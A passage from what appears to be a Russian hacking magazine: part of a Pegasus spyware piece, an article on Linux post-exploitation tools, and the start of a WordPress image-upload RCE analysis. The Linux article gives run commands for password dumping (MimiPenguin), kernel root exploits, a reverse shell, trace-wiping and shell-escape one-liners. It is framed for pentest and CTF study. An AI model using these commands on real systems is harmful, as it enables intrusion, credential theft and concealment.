ства Apple, не подвергнутые процедуре джейлбрейка. В ходе нес кольких
известных целевых атак «Пегаса» пытались дос тавить на iPhone при помощи
SMS‐сообщений, содержащих вредонос ную ссылку. Для установки в систему
шпион использует уязвимости, правда для устаревших на сегодняшний день
версий iOS (до 9.3.5). Одна ко никто не знает точно, на что способны более
современные редакции Pegasus, разработчики которого (а в создании шпи‐
она подозревают израильскую компанию NSO Group) здравству ют и поныне.
   Троян состоит из нес коль ких функциональных модулей, которые под гру‐
жает на инфицированное устройство по мере необходимости. Набор фун‐
кций у Pegasus в целом стандартен для подобного spyware: это кейлоггинг,
создание скриншотов, чтение SMS и почтовой переписки, копирование исто‐
рии браузе ра, прослушивание телефонных звонков и так далее.
   Программа старается вести себя по воз можнос ти скрытно и никак не про‐
являться на скомпрометированном устройстве. Если она обнаружит, что
в  телефон  вставлена  другая  сим‐карта,  или  не  суме ет  достучаться
до управляющего сервера в течение 60 суток, программа самоуничтожается.
Все это свидетельствует о том, что Pegasus заточен на таргетированные ата‐
ки, это не «оружие массового поражения».
  Известные образцы Pegasus для Android не используют уязвимостей,
но для получения администраторских привилегий (без которых не смогут
украсть с девайса ничего, кроме названия его модели) применяют традици‐
онную тактику — достают юзера назойливыми алертами до тех пор, пока он
не согласится нажать на заветную кнопочку.


Защита
Методов защиты от Pegasus существу ет несколько: для владельцев iPhone
и  iPad — вовремя обновлять систему, для пользователей  Android —
не выдавать левым приложениям администра тивных полномочий, даже если
они очень об этом просят.


ВЫВОДЫ
Коммерческие программы‐шпионы были, есть и будут есть системы поль‐
зователей. Просто потому, что спрос, как говорил один умный дядька по име‐
ни Джон Мейнард Кейнс, рождает предложение.
   Антивирусы, как мы уже выяс нили, не панацея, поэтому для защиты от spy‐
ware следует исполь зовать самый мощный из существующих на сегодняшний
день аналитических инс трументов — головной мозг.
  Проверяй устанавливаемые программы анти вирус ными утилитами, следи,
на какие сетевые адреса они стучатся во время работы, наблюдай, какие про‐
цессы запускаются в системе, не забывай вовремя обновлять ОС, отключать
ненужные компоненты вроде Java Runtime и накаты вать по вечерам не только
ноль пять нефильтрованного, но и все акту альные патчи безопасности.
ВЗЛОМ
ПОСТ-
ЭКСПЛУАТАЦИЯ
LINUX

ПОДНИМАЕМСЯ
ОТ ЮЗЕРА
ДО БОГА
В НЕСКОЛЬКО
КЛИКОВ





     Иван Пискунов





В этом материале тебя ждет обзор и примеры примене ния
наиболее известных и, самое глав ное, рабочих утилит пос‐
тэксплуатации серверов с Linux. Как манипулировать сис‐
темой, стать рутом или бескомпромиссно слить все данные
после того, как ты уже проник внутрь защищенного кор‐
поративного периметра, обошел десятки фаеров и хонипо‐
тов, а может, даже получил физический доступ к жертве…
Расширь влияние и почувствуй себя богом!


КОНЦЕПЦИЯ KILL CHAIN В ПРАКТИКЕ ПЕНТЕСТА
Если рассматривать практику пентеста, вся цепочка событий, приводящих
к какой‐либо успешной атаке на целевую ИТ‐инфраструктуру, условно раз‐
бивается на сме няющие друг друга пос ледова тельные этапы. Эта цепочка
действий получила название  Kill Chain, или, как это зву чит в русской
нотации, убийствен ная цепоч ка (не исключено, что данный творческий
перевод сделал сам Капитан Очевидность. — Прим. ред.).
   Термин сейчас очень часто исполь зуется в мире ИБ, а широкое рас‐
пространение он получил пос ле пуб ликации доклада Intelligence‐Driven Com‐
puter Network Defense Informed by Analysis of Adversary Campaigns and Intrusion
Kill Chains компании Lockheed Martin, специализирующейся в области ави‐
астроения и авиакосмической техники, в котором среди прочего описывается
последовательность шагов зло умышленника, осу ществля юще го незаконное
проникновение (взлом) в информа ционную систему.
  Спросишь меня, как связаны Lockheed Martin и информационная безопас‐
ность? Все довольно просто: эта компания имеет прямое отношение к ВПК
Соединенных Штатов. Используя опыт Минобо роны и других силовых
ведомств, компания еще в 2011 году сформулировала план, сос тоящий
из семи последовательных стадий, которые выполняются одна за другой
и приводят к взлому целевой системы.
   Если кратко, то вот эти семь этапов ниже и есть Kill Chain.
 1. Раз ведка. Исследование, идентификация и выбор целевой системы
   для взлома.
 2. Во ору жение. Осна щение хакерски ми тул зами и malware для совершения
   нападения.
 3. Доставка. Донесение вредоносного контента (тулз) до целевой системы.
 4. Зараже ние. Запуск вредоносного кода или эксплуатация уязвимостей
   системы.
 5. Инстал ляция.  Открытие  удаленного  дос тупа  и  другие  действия
   с зараженной системой.
 6. По луче ние управле ния. Управление зараженной системой.
 7. Вы пол нение действий. Сбор, кража, отправка данных, шифрование
  файлов, подмена и удаление данных, затира ние следов и так далее.





                      Цепочка Kill Chain

А вот небольшой пример, иллюстрирующий ее примене ние (проведение ата‐
ки step‐by‐step).





                   Сценарий ата ки step‐by‐step

Постэксплуатация, если накладывать ее на эту таблицу, реализуется на 5‐й
и 6‐й фазах, то есть когда хакер уже проник внутрь корпоративного перимет‐
ра,  обойдя  периметровые  и  некоторые  end‐point  средства  защиты,
с помощью малвари или экспло ита получил дос туп к системе и готов действо‐
вать дальше. Постэксплуатация предшеству ет 7‐й фазе «Выполнение дей‐
ствий», когда хакер достигает, если так можно сказать, биз нес‐цели своей
атаки, однако прежде, чем это произойдет, необходимо закрепиться внутри
сети, дособрать нужную информацию о сети и серверах, скорректировать
цели, подготовить каналы свя зи для передачи данных и прочее. Связано это с
тем, что, как правило, конфиденциальные данные не лежат на каком‐то одном
серваке или крутятся в одном приложении, поэтому и необходимо дальше
изучать сеть, хранилища данных, искать артефакты — в этом как раз отчасти
и помогают инструменты постэкс плуата ции.


             INFO

                     Постэксплуатация   (англ.   post‐exploitation)  —
                        это один из этапов взлома компьютерных систем,
                       позволяющий собирать дальнейшую информа‐
                   цию о целевой системе, получить дальнейший
                      доступ к сети и хранящимся данным. Фаза пос‐
                         тэксплуатации   позволяет   идентифицировать
                        такие вещи, как дополнительные подсети, мар‐
                    шрутизаторы, названия серверов, сетевых служб
                      и установленных приложе ний.


Основные паттерны, по которым работа ют злоумышленники, предполагают:
 • получение доступа на выполнение про извольного кода или команд;
 • изучение данных, хра нящихся на сервере;
 • перехват данных, которых нет на системе сейчас, но которые могут
   появиться в будущем;
 • организация перманентного доступа к целевой сис теме (RAT);
 • эскалация привиле гий до уровня системы для непривиле гированной учет‐
   ной записи.

Дополнительно хакер может получать информа цию о скомпрометированной
системе, анализируя:
 • конфигурацию системы (логин и пароль к БД в исходных кодах);
 • конфигурацию веб‐сервера (например, httpd.conf, .htaccess);
 • исходные коды приложения (поиск уязвимостей через анализ логики при‐
   ложения);
 • доступ к окружению (изнутри сети может быть проще попасть на соседние
   серверы и изолированные сег менты подсети);
 • базы данных (аутентифика ционная информа ция к другим системам, хра‐
  нящаяся в них).

Для Windows типичные примеры пос тэкс плуатации — такие атаки, как Pass‐in‐
the‐Hash, реализуемые извес тной тулзой mimikatz, о которых мы писали
в  нескольких прошлых материалах  тут и  тут,  запуск бинарного  кода
с помощью PsExec, проб рос VPN и/или DNS‐туннеля, о которых более под‐
робно рассказывали здесь и здесь. И еще известные паки для нашумевших
недавно уязвимостей типа EternalBlue с помощью FuzzBunch и PowerShell Em‐
pire.
  Мы же в разделе, который пойдет ниже, сделаем акцент на рас смотрение
аналогичных инструментов пос тэксплуатации, но исключительно под Linux‐
системы. Ведь все знают, что back‐end крупных, особенно DevOps’вских ком‐
паний обычно вращаются именно на пин гви не.


ОБЗОР ОСНОВНЫХ ИНСТРУМЕНТОВ ПОСТЭКСПЛУАТАЦИИ
Общие векторы атак на целевой машине после получения доступа:
 • эскалация привилегий в системе (Vectors of Privilege Escalation);
 • получение информации о дистрибутиве и ядре (OS Detail & Kernel Version);
 • поиск уязвимого ПО (Any Vulnerable package installed or running);
 • избыточные права дос тупа (Files and Folders with Full Control or Modify
   Access);
 • файлы с разрешениями SUID (File with SUID Permissions);
 • примонтированные тома (Mapped Drives (NFS));
 • чувствительные файлы и директории (Potentially Interesting Files);
 • изменение сре ды окру жения (Environment Variable Path);
 • модификация сетевого интерфейса и трафика (Network Information — inter‐
   faces, arp, netstat);
 • модификация запущенных процес сов в оперативной памяти (Running
   Processes);
 • задачи, запускаемые по расписанию (Cronjobs);
 • использование утилиты sudo для пользователя (User’s Sudo Right);
 • различные манипуляции с исходным и бинарным кодом (Wildcard Injection).


PXEnum (Post eXploitation Enumeration script for Linux)
Основная задача данного скрипта — функция перечисления (англ. Enumera‐
tion). Он вытаскивает всю дос тупную информа цию о системе. Скрипт соз дан
для настоящих лентяев. Окей, если высказаться более политкорректно, то
«для тех, кто ценит свое время». :) Встроенные команды позволя ют также уго‐
нять хеши паролей, содержание директорий, все све дения о системе,
наличие application‐серверов, приложений, соединений, юзеров.
  Для запуска скрипта не требуются права root, он работает в стандартном
терминале. Перед инсталляцией качаем тул зу с помощью Wget:


$ wget https://raw.githubusercontent.com/shawnduong/PXEnum/master/
PXEnume.sh

Устанавливаем:


$ git clone https://github.com/shawnduong/PXEnum.git
$ cd PXEnum/
$ chmod +x PXEnum.sh
$ bash PXEnum.sh

Или другой вариант запуска:


$ sh PXEnum.sh





                Пример запус ка PXEnum в Kali Linux


MIDA Multitool (Bash Script Purposed For System Enumeration, Vul-
nerability Identification And Privilege Escalation)
Другой интересный инстру мент — MIDA Multitool, созданный на базе менее
именитых собратьев SysEnum и RootHelper, но предлагающий гораздо боль‐
ше возможностей.
  По воле разработчика MIDA Multitool объеди няет в себе отдельные фун‐
кции своих предшественников, а именно:
 • SysEnum — Bash‐скрипт, предназна ченный для получе ния основной
  информации о системе, включая следующие данные: текущий поль‐
   зователь, IP‐конфигура ция, таблицы ARP, запущенные процессы;
 • RootHelper — призван помочь в деле эска лации привилегий в системе,
   которая  была  скомпро метирована,  при  помощи  выполнения  ряда
   перечислений и использования доверительных сценариев.

Устанавливаем скрипт в систему с GitHub:


$ git clone https://github.com/NullArray/Bash‐Kit‐Multitool
$ cd Bash‐Kit‐Multitool
$ chmod +x bashkit.sh

Запускаем скрипт:


$ /.bashkit.sh





        Ме ню выбора действий пос ле запус ка MIDA Multitool

Вывод некоторой информации по системе:





            Данные об учетных записях в текущей системе


MimiPenguin
Очень хорошо известный в узких кругах пентестеров скрипт под названием
MimiPenguin. Основная задача утилиты — сброс пароля на вход в систему
от текущего пользователя Linux (то есть непривилегированного). В некотором
роде это аналог утилиты mimikatz для дампа пароля в Windows‐системах.
  Кроме того, MimiPenguin поддерживает такие приложения, как VSFTPd
(активные подключения клиента FTP), Apache 2 (активные/старые сеансы
HTTP BASIC AUTH, но для этого требует ся Gcore) и OpenSSH‐сервер
(активные подключения SSH с использованием команды sudo). И вообще,
необходимо сказать, что MimiPenguin нередко становится частью экс плоитов
под Linux, так что тулза очень и очень востребова на. :)
   Устанавливаем MimiPenguin, забирая его с репозитория GitHub:


$ git clone https://github.com/huntergregal/mimipenguin





     Окно терминала, отоб ражающее процесс уста новки MimiPenguin

Если у тебя еще не уста новлен GitHub, то юзай эти команды:


$ apt install git       // Debian/Ubuntu systems
$ yum install git       // RHEL/CentOS systems

Переходим в директорию MimiPenguin и запускаем скрипт:


$ cd mimipenguin
$ ls –a
$ chmod +x mimipenguin.sh
$ ./mimipenguin.sh





        Результат работы MimiPenguin — все пароли как на ладони


Auto-Root-Exploit
Сингловый скрипт, созданный для одной‐единс твенной цели — получить пра‐
ва root на текущую учетную запись, под которой он был запущен с помощью
эксплуатации известных багов. Поддержи вает версии ядра, начиная с Linux
Kernel 2.6 и до 4.8.0‐41‐generic, а также часть ОС семей ства *BSD.
   Установка в систему:


$ git clone https://github.com/nilotpalbiswas/Auto‐Root‐Exploit
$ cd Auto‐Root‐Exploit
$ chmod +x autoroot.sh

Проверка версии ядра (для того чтобы выб рать нуж ный эксплоит‐пак):


$ uname –a





          Получение сведений о версии ядра ОС в Kali Linux

Использование:


$ bash autoroot.sh N

где N — это мажорный номер версии ядра ОС.



  for kernel version 2.6 all
  bash autoroot.sh 2


  for kernel version 3 all
  bash autoroot.sh 3


  for kernel version 4 all
  bash autoroot.sh 4


  for freebsd & openbsd all
  bash autoroot.sh bsd


  for apple macos all
  bash autoroot.sh app


  for kernel 2.6,3,4 bsd & app all
  bash autoroot.sh all





              Стартовое меню выбора в Auto‐Root‐Exploit





   Результат работы Auto‐Root‐Exploit — получение root‐прав на систему


LARE ([L]ocal [A]uto [R]oot [E]xploiter)
И напоследок еще один довольно прос той скрипт, который позволяет
с помощью исполь зования извес тных уяз вимостей в ядре ОС получать при‐
вилегии root удален но с ата кующей машины. Скрипт использует локальные
эксплоиты для получения root‐прав для версий ядра Linux Kernel v2.6 — v4.8.
   Кстати, эта тулза очень час то находит свое при менение в различных War
Games и CTF‐сорев нованиях, например hackthebox.gr, или даже на сер‐
тификационном экзамене OSCP.
   Устанавливаем скрипт в систему:


$ git clone https://github.com/EnigmaDimitri/LARE && cd LARE
$ chmod +x LARA.sh

Пример локального запус ка скрипта:


$ LARE.sh ‐a

или


$ ./LARE.sh ‐a





                 Запуск LARE на локальной машине

Запуск скрипта на целевой машине в сети:


$ LARE.sh ‐l [Attackers‐IP]





               Атака на удаленную машину в локальной сети

Запуск на машине с под ключением к базе данных эксплоитов на GitHub:


$ LARE.sh ‐l or ./LARE.sh ‐l


             INFO

                    Эскалация (повышение) привилегий — это экс‐
                        плуатация уязвимостей в операционной системе
                      или прик ладном ПО, позволяющая получить дос‐
                         туп  к  ресурсам,  которые  обычно защищены
                         от определенного пользовате ля. В результате
                        хакер имеет  больше  привилегий,  чем  пред‐
                        полагалось разработчиком или системным адми‐
                       нистратором, и может выполнять несанкциони‐
                       рован ные действия в целевой системе.



ПРОВЕРКА И ЗАЩИТА СИСТЕМЫ ОТ ТЕХНИК ПОСТЭКСПЛУАТАЦИИ
Кроме традиционных мер, таких как установка патчей и минимизация при‐
вилегий, безопасность системы дополнительно обеспечивают специальные
тул зы для провер ки сис темы. В противо вес популярному мнению (согласно
которому к постэксплуата ции ведут только зиродеи или устаревший софт)
к грандиозному факапу ведут и ошибки конфигурации — предоставление из‐
быточных прав доступа, пароли по умол чанию, системные каталоги и файлы
в общем доступе, выключенные опции безопас ности в программах, работа‐
ющих из коробки, и прочие огрехи.
  Ниже будут представлены утилиты (скрипты) быс трого анализа системы
и проверки ее на факт выполнения несанкци они рованных и потенциально
опасных действий со стороны неп ривилегированных пользователей.


Bashark
Bashark — популярный скрипт, который помога ет пентестерам и исследова‐
телям в области безопас ности тестить воз можнос ти управления сис темой
после успешной эксплуатации.
  Фирменные фичи и возможности, заявленные раз работчиком:
 • быстрый запуск, мгновенная реакция;
 • мультиплатформенность: Unix, OS X, Solaris и дру гие;
 • отсутствие зависимостей от версии ядра ОС или установленных пакетов;
 • иммунитет к эвристичес кому и поведенческому анализу (обход средств
   защиты);
 • встроенные алиасы к популярным командам;
 • расширение стандартной обо лочки bash‐командами для постэксплуата‐
   ции;
 • процедура заметания следов после завершения работы (Stealthy);
 • расширяемость — возможность дописывать свои команды и юзать из тер‐
   минала;
 • поддержка табуляции при наборе команд.

Итак, качаем скрипт с помощью Git:


$ git clone https://github.com/TheSecondSun/Bashark.git





                     Ус тановка Bashark в систему

Переходим в соот ветствующую директорию и даем права на выполнение:


$ cd Bashark
$ chmod +x bashark.sh




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 ПОСТ-ЭКСПЛУАТАЦИЯ
               LINUX
               ПОДНИМАЕМСЯ ОТ ЮЗЕРА ДО БОГА
                         В НЕСКОЛЬКО КЛИКОВ




Запускаем:


$ ./bashark.sh





                  Стартовое меню скрипта Bashark





          Вывод информации о системе — краткий вариант

В чем еще уникальность Bashark? С помощью опции portscan мы можем
сканировать внутреннюю сетку из‐под одной скомпрометированной машины.
Чтобы получить все файлы конфигурации с дру гой взломанной машины
на Linux, можно заюзать опцию getconf. Команда позволяет извлекать все
файлы конфигурации, хранящиеся в каталоге /etc. Точно так же легко и прос‐
то можно использовать опцию getprem для прос мотра всех двоичных фай‐
лов на целевой системе.
   Сканируем удален ную машину:


$ portscan <target’s IP>

Получаем конфиги:


$ getconf

Получаем файлы:


$ getprem

Получаем реверс‐шелл:


$ revshell <target’s IP> <Port 31337>





        Получение реверсивной оболочки на уда ленной машине

Еще одна приятная мелочь — это фича самоочистки (удаления следов
работы в системе). Например, если ты соз давал файлы или каталоги во вре‐
мя работы в контек сте Bashark с помощью опции -t (создать файл) или -mkd
(создать каталог), подпрограмма quit (то есть завершение работы) будет
активировать директиву cleanup, затира ющую все следы присутс твия в сис‐
теме.





          Заметание следов при завершении работы скрипта


LinEnum (Local Linux Enumeration & Privilege Escalation Checks)
Данный скрипт представляет собой экспресс‐тест по таким позициям,
как Kernel and distribution release details, System Information, Privileged access,
Jobs/Tasks, Services, Default/Weak Credentials, Searches, Platform/software spe‐
ciﬁc tests.
   Скрипт успешно про тес тирован на раз личных версиях дистрибутивов
Ubuntu, Debian, Red Hat и CentOS. Программа не ищет и не пытается выпол‐
нять эксплоиты, как некоторые дру гие аналогичные тул зы, — она только
собирает информацию и делает проверки воз можных векторов эскалации
привилегий.
   Установка в систему:


$ git clone https://github.com/rebootuser/LinEnum
$ cd LinEnum/

Простой запуск с вызовом списка ключей:


$ ./LinEnum.sh

Пример запуска скрипта с опциями (ключами):


$ ./LinEnum.sh ‐s ‐k keyword ‐r report ‐e /tmp/ ‐t

Описание ключей:



  ‐k — ввести ключевое слово
  ‐e — указать директорию для экспорта отчета
  ‐t — включить в отчет «длинные» тесты (дополнительные тесты)
  ‐s — произвести проверку эскалации текущей учетки sudo perms
  ‐r — задать имя итогового отчета
  ‐h — вызвать встроенную справку по программе
  ‐k — опциональный переключатель, с которым можно указать ключевое слово
  для поиска файлов по нескольким расширениям


Запуск без опций означает огра ниченное сканирование без файла вывода.





                      Стартовое меню LinEnum





                Результаты запус ка скрипта LinEnum


LinuxPrivChecker
Еще один полезный в нашем деле скрипт, написанный на Python. Этот сце‐
нарий предназначен для локального выпол нения в системе с целью перечис‐
ления базовой системной информа ции и поиска общих векторов повышения
привилегий,  таких  как общедос тупные файлы, неверные  конфигурации
демонов и библиотек, пароли, хра нимые в виде открытого текста, и баги,
соответствующие наибо лее популярным экс пло итам.
  Основные области проверки:
 • основная информация о системе (ОС, ядро, имя системы и так далее);
 • информация о сети (ifconﬁg, route, netstat и т. д.);
 • разная информация о файловой системе (mount, fstab, cron jobs);
 • информация о пользователе (текущий пользователь, все пользователи,
   суперпользователи, история команд);
 • права доступа к файлам и катало гам (дос тупные для записи файлы/
   каталоги, файлы suid, корневой домашний каталог);
 • файлы, содержащие незашифрованные пароли;
 • интересные файлы, про цессы и приложения (все процессы и пакеты, все
   процессы, запускаемые пользователем root и связанные пакеты, версия
   sudo, файл конфигура ции Apache);
 • все установленные языки и инс тру менты (GCC, Perl, Python, Nmap, Netcat,
   Wget, FTP и так далее);
 • все соответствующие экс плоиты повышения привилегий (с использовани‐
  ем базы дан ных эксплоитов с применимыми версиями ядра, пакетами/
   процессами программного обеспечения).

Проверка на эскалацию привилегий про изво дит ся в сле дующих программах:



  nmap
  ‐interactive


  vi
  :!bash
  :set shell=/bin/bash:shell


  awk
  awk ‘BEGIN {system(“/bin/bash”)}’


  find
  find / ‐exec /usr/bin/awk ‘BEGIN {system(“/bin/bash”)}’ \;


  perl
  perl ‐e ‘exec “/bin/bash”;’


Итак, качаем скрипт:


$ wget http://www.securitysift.com/download/linuxprivchecker.py

Запускаем с помощью всего лишь одной команды:


$ chmod +x linuxprivchecker.py
$ ./linuxprivchecker.py

Или другой вариант запуска:


$ python linuxprivchecker.py





             Результаты запус ка скрипта LinuxPrivChecker


Unix-privesc-check
Unix‐privesc‐checker — это мощный скрипт, работающий в Unix‐системах
(протестирован на Solaris 9, HPUX 11, различных Linux 3.х и FreeBSD 6.2+).
После запуска скрипт пытается найти неправиль ные твики конфигурации сис‐
темы, процессы, которые могут позволить локальным непривилегированным
пользователям повышать привилегии дру гих юзеров или получать доступ
к локальным приложениям, например базам данных MySQL.
  Основные области проверки:
 • слабые пароли и значения по умолчанию;
 • конфигурация стека IP (без ненужного использования IPv6, без фор‐
   вардинга IP‐пакетов и так далее);
 • некорректные права доступа к фай лам (чтение/изме нение конфиден‐
   циальных данных);
 • настройка локальных приложений (просмотр sshd_conﬁg, httpd.conf);
 • другие полезные вещи (например, уда лен ное ведение журнала, исполь‐
   зование небезопасных протоколов TCP/IP).

Основное  внимание  раз работчики  данного  скрипта  уделяют проверке
на предмет распространенных ошибок в конфигурации системы и некоррек‐
тно настроенных разрешений на дос туп к директори ям и файлам. Важно
отметить, что скрипт не проверяет наличие отсутствующих патчей для ядра
ОС или установленных пакетов, но это и не его задача, ведь для ее решения
существуют более сложные утилиты, о которых мы рассказывали в нашем
предыдущем материале про аудит Linux.
   Скрипт может запускаться как от имени обычного пользовате ля, так и от
имени root. В последнем случае у скрипта больше привилегий и он может
выпол нить ряд тестов, недоступных из‐под учет ки непривилегированного
пользователя. Для регулярного мониторин га запуск скрипта можно про‐
писать как задание cron.
  Пример запуска скрипта:


$ ./unix‐privesc‐check > output.txt





               Запуск unix‐privesc‐check в терминале





     Пример вывода результатов работы unix‐privesc‐check в output.txt


ЗАКЛЮЧЕНИЕ
Сегодня в материале мы рассмотрели самые популярные и, главное, рабочие
инструменты, которые используются в фазе пос тэкс плуатации. Приведенный
набор тулз пригодится как участникам War Games и различных CTF‐сорев‐
нований, так и опытным пентестерам, проверя ющим на прочность безопас‐
ность корпоративного периметра. Также в нашем обзоре мы привели
еще несколько утилит, которые поз волят прочекать доверенные тебе сис‐
темы на факт возможности эскалации при вилегий и использования дру гих
техник постэксплуатации. Теперь ты вооружен!


Полез ные ссыл ки
Поскольку объем нашей статьи не умещает всего, что еще можно было ска‐
зать по заявленной теме, тебе, дорогой мой друг, предоставляется счастли‐
вая возможность попрактиковаться в самостоятельном изучении и заценить
вот этот список допол нительных материалов.
 • Linux Post Exploitation Command List — шпаргалка по основным командам
   постэксплуатации, которые можно самос тоятель но вводить в терминале.
   Ничего необыч ного, стандартные команды, известные любому мало‐маль‐
   ски знающе му Linux поль зователю.
 • Post Exploitation Collection — репозиторий GitHub, представляющий собой
   огромную коллекцию трюков постэксплуата ции для Windows, Linux, Mac,
   *BSD, а также .msf4 & Metasploit scripts.
 • Basic Linux Privilege Escalation — одностра ничный гайд по основным век‐
   торам атак на фазе пос тэксплуата ции.
 • GitBook Post Exploitation — лютый GitBook по теме Privilege Escalation. Рас‐
   сматривается куча техник эксплуата ции: Kernel exploits, Programs running as
    root, Inside service, Suid misconﬁguration, Abusing sudo‐rights, Bad path con‐
   ﬁguration, Cronjob, Unmounted  ﬁlesystems. Примеры готовых скриптов
   на Python.
 • Cheat map — еще один вариант хендбука по теме постэкс плуатации с при‐
  мерами команд и кода на скриптовых языках.
ВЗЛОМ





      aLLy
      ONsec
    @iamsecurity

ОТКРЫТКА
   WORDPRESSДЛЯ
ЗАХВАТЫВАЕМ КОНТРОЛЬ НАД САЙТОМ,
СПРЯТАВ КОД В КАРТИНКЕ





Сегодня я рас скажу об уязвимости, дающей воз можность
исполнять произвольный код в самой популярной CMS
в мире — WordPress. Причина бага — в недостаточной филь‐
трации метаданных  загружен ного файла,  что дает воз‐
можность выйти из директории, используя некорректную
логику при кадрирова нии картинок. Зло умышленник может
заг рузить  произвольный  PHP‐код  в  теле  изображения
и поместить его в папку, откуда будет возможен вызов.


Исполь зуемые уяз вимос ти
 • CVE-2019-8942 — уязвимость заключается в возможности свобод ного
   манипулирования метаданными записей бло га, а именно ключом _w
  p_attached_file, который отвечает за путь загруженного аттача.
 • CVE-2019-8943 — из‐за некорректной логики функции wp_crop_image
   атакующий,   используя   конструкцию   вида  /valid/image/path.
  jpg?/../../path/traversal, может выйти из директории, предназна‐
   ченной для хранения пользовательских файлов, и записать файл в про‐
   извольный путь.



Проблему обнаружили исследователи из RIPS Technologies еще в октябре
прошлого (2018‐го) года. Оригинальный отчет об этом был представлен Сай‐
моном Сканнеллом (Simon Scannell) 19 февраля и содержит общее описание
обнаруженных багов, варианты их экс плуата ции и видео с PoC.
  Мы же детально прой демся по всем этапам эксплу атации и разберемся
в проблеме. Поехали!


СТЕНД
Для демонстрации уязвимости я, как всегда, вос пользуюсь докер‐контей‐
нерами для поднятия тестового окружения.
  Сначала база данных. Я возьму привычный MySQL.


$ docker run ‐d ‐‐rm ‐e MYSQL_USER="wprce" ‐e MYSQL_PASSWORD="QJmfdG
jW47" ‐e MYSQL_DATABASE="wprce" ‐‐name=wpmysql ‐‐hostname=mysql
mysql/mysql‐server

Теперь дело за контейнером с WordPress.


$ docker run ‐it ‐‐rm ‐p80:80 ‐‐name=wprce ‐‐hostname=wprce ‐‐link=
wpmysql debian /bin/bash

Не забывай слинковать его с контейнером базы данных. Далее устанавлива‐
ем требуемые пакеты, среди них, разумеется, веб‐сервер Apache и PHP.


$ apt‐get update && apt‐get install ‐y apache2 php php7.0‐mysqli
php‐imagick php‐xdebug nano wget build‐essential checkinstall

Обрати внимание на пакет php‐imagick. Уяз вимость связана с обработкой
картинок, для чего частенько используется рас ширение GD, но сегодня осо‐
бый случай и нам нужен ImageMagick. Подробнее об этом я рас скажу, говоря
об эксплуатации.
   Теперь качаем WordPress версии 5.0, это последняя версия с багом,
который мы готовимся изу чить.


$ cd /tmp && wget https://wordpress.org/wordpress‐5.0.tar.gz

Распаковываем архив в веб‐рут.


$ tar xzf wordpress‐5.0.tar.gz
$ rm ‐rf /var/www/html/* && mv wordpress/* /var/www/html/
$ chown ‐R www‐data:www‐data /var/www/html/

Если хочешь дебажить приложение вместе со мной, то нас траивай удаленную
отладку в Xdebug. Я буду использовать в качес тве дебаггера PHPStorm.


$ echo "xdebug.remote_enable=1" >> /etc/php/7.0/apache2/conf.d/
20‐xdebug.ini
$ echo "xdebug.remote_host=192.168.99.1" >> /etc/php/7.0/apache2/
conf.d/20‐xdebug.ini

Наконец‐то запускаем сам сервер и инсталлируем WordPress.


$ service apache2 start





                       Ус тановка WordPress 5.0

После этого не забудь отключить автообновление CMS на всякий случай.


$ echo "define( 'WP_AUTO_UPDATE_CORE', false );" >> /var/www/html/
wp‐config.php


МАНИПУЛИРУЕМ МЕТАДАННЫМИ, ИЛИ CVE-2019-8942
Проэксплуатировать уязвимость мож но только от име ни пользователей,
которым разрешена заг рузка медиафайлов. Роль author впол не подойдет
для этих целей, поэтому соз дадим нового пользователя с такими правами.
   Теперь немного о  заг рузках медиафайлов. Помимо  того  что файл
физически помещается в директорию wp‐content/uploads, в процессе заг‐
рузки его метаданные заносятся в таблицу wp_postmeta. Для CMS нет осо‐
бой разницы между записями, страница ми и файлами, для сис темы все
это объекты типа WP_Post, и раз лича ются они метаданными, атрибутом
post_type и прочим.


/wp-includes/class-wp-post.php
022: final class WP_Post {
...
186:    /**
187:     * The post’s type, like post or page.
...
192:    public $post_type = 'post';


/wp-includes/post.php
20: function create_initial_post_types() {
21:     register_post_type( 'post', array(
...
41:     register_post_type( 'page', array(
42:         'labels' => array(
...
62:     register_post_type( 'attachment', array(
63:         'labels' => array(

Загрузим рандомную картинку и заг лянем в базу данных.





       Метаданные загруженного файла в таб лице wp_postmeta

Ключ _wp_attachment_metadata содержит сери ализованный объ ект, где
располагается вся информа ция о загруженной картинке, которая может
понадобиться WordPress. Главная проб лема в том, что злоумышленник может
перезаписать любые метаданные про извольными.
   Как мы выяснили, загруженный файл в WordPress является экземпляром
Post. Поэтому за добавление и обновление данных о нем отве чает один и тот
же метод — wp_insert_post. Только в первом случае он почти сразу вызыва‐
ется из функции wp_insert_attachment.


/wp-includes/post.php
5068: function wp_insert_attachment( $args, $file = false, $parent =
0, $wp_error = false ) {
5069:   $defaults = array(
5070:       'file'        => $file,
5071:       'post_parent' => 0
5072:   );
5073:
5074:   $data = wp_parse_args( $args, $defaults );
5075:
5076:   if ( ! empty( $parent ) ) {
5077:       $data['post_parent'] = $parent;
5078:   }
5079:
5080:   $data['post_type'] = 'attachment';
5081:
5082:   return wp_insert_post( $data, $wp_error );
5083: }


/wp-includes/post.php
3143: /**
3144:  * Insert or update a post.
3145:  *
...
3203: function wp_insert_post( $postarr, $wp_error = false ) {
3204:   global $wpdb;
3205:
3206:   $user_id = get_current_user_id();

Во втором случае — цепочкой edit_post => wp_update_post => wp_in‐
sert_attachment.


/wp-admin/includes/post.php
187: function edit_post( $post_data = null ) {
188:    global $wpdb;
189:
190:    if ( empty($post_data) )
191:        $post_data = &$_POST;
...
377:    $success = wp_update_post( $post_data );


/wp-includes/post.php
3776: function wp_update_post( $postarr = array(), $wp_error = false
) {
3777:   if ( is_object($postarr) ) {
...
3817:   if ($postarr['post_type'] == 'attachment')
3818:       return wp_insert_attachment($postarr);
3819:
3820:   return wp_insert_post( $postarr, $wp_error );
3821: }





      Отладка функции редактирова ния данных загруженного файла

Как видишь, дан ные берут ся пря мо из запроса через дос туп к ключам мас‐
сива $_POST. В ито ге все это доб ро попадает в эту часть кода:


/wp-includes/post.php
3203: function wp_insert_post( $postarr, $wp_error = false ) {
...
3600:   if ( ! empty( $postarr['meta_input'] ) ) {
3601:       foreach ( $postarr['meta_input'] as $field => $value ) {
3602:           update_post_meta( $post_ID, $field, $value );
3603:       }
3604:   }

Таким образом, если передать через POST‐запрос в параметре meta_input
массив вида метаключ  =>  значение, то можно добавлять и обновлять
метаданные текущего пос та.





  Массив из параметра meta_input обрабатывается функци ей
  update_post_meta

Другими словами, можно менять значения meta_key и meta_value в таблице
wp_postmeta.





         Обновленные метаданные в таб лице wp_postmeta

В этом нам помогает функция update_post_meta. Не так давно в статье «Уда‐
ленное удаление. Как захватить контроль над WordPress, зас тавив его стереть
файл» я уже писал про возможность указать произвольные метаданные. Там
этот трюк использовался для эксплуата ции уязвимости удаления файлов.
Если ты ее не читал, то советую ознакомиться.
